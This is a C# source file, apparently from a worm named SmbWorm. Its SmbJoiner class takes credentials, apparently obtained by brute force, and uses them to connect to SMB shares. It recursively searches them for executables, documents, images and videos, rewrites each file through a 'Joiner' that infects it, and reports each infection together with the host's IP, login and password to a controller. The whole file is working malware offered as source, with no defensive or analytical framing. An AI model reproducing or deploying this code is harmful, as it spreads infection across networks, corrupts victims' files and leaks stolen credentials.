using System.Collections.Generic;
using System.IO;
using Leb128;
using Plugin.Helper;
using SMBLibrary;
using SMBLibrary.Client;
using SmbWorm.Smb;
using Worm2.Files;

namespace SmbWorm.Joiner;

public class SmbJoiner
{
	private NTStatus status;

	private Brute brute { get; set; }

	public SmbJoiner(Brute brute)
	{
		this.brute = brute;
	}

	private void DirSearch(string sDir, ISMBFileStore fileStore)
	{
		foreach (FileDirectoryInformation item in SmbMethods.GetDir(fileStore, sDir))
		{
			if (item.FileName == "." || item.FileName == "..")
			{
				continue;
			}
			foreach (FileDirectoryInformation file in SmbMethods.GetFiles(fileStore, Path.Combine(sDir, item.FileName)))
			{
				if (!file.FileName.EndsWith(".exe") && !file.FileName.EndsWith(".txt") && !file.FileName.EndsWith(".png") && !file.FileName.EndsWith(".jpg") && !file.FileName.EndsWith(".jpeg") && !file.FileName.EndsWith(".gif") && !file.FileName.EndsWith(".mp4") && !file.FileName.EndsWith(".avi") && !file.FileName.EndsWith(".mkv") && !file.FileName.EndsWith(".xlsx") && !file.FileName.EndsWith(".xls") && !file.FileName.EndsWith(".xlsm") && !file.FileName.EndsWith(".csv") && !file.FileName.EndsWith(".docx") && !file.FileName.EndsWith(".doc") && !file.FileName.EndsWith(".rtf") && !file.FileName.EndsWith(".pptx") && !file.FileName.EndsWith(".ppt") && !file.FileName.EndsWith(".ppsx") && !file.FileName.EndsWith(".potx"))
				{
					continue;
				}
				string text = Path.Combine(sDir, item.FileName, file.FileName);
				byte[] array = SmbMethods.ReadFile(fileStore, brute.SMB2Client, text);
				if (array != null)
				{
					byte[] array2 = Worm2.Files.Joiner.Compiler(array, Path.GetExtension(file.FileName));
					if (array2 != null)
					{
						SmbMethods.ReWriteFile(fileStore, brute.SMB2Client, array2, text);
						Client.Send(LEB128.Write(new object[2]
						{
							"WormLog2",
							"File infected Smb: \\\\" + brute.Ip + "@" + brute.Login + ":" + brute.Password + "\\" + text
						}));
					}
				}
			}
			DirSearch(Path.Combine(sDir, item.FileName), fileStore);
		}
	}

	public void Start()
	{
		List<string> list = brute.SMB2Client.ListShares(out status);
		if (status != 0)
		{
			return;
		}
		foreach (string item in list)
		{
			ISMBFileStore fileStore = brute.SMB2Client.TreeConnect(item, out status);
			if (status == NTStatus.STATUS_SUCCESS && !item.ToLower().Contains("users"))
			{
				DirSearch("", fileStore);
			}
		}
	}
}
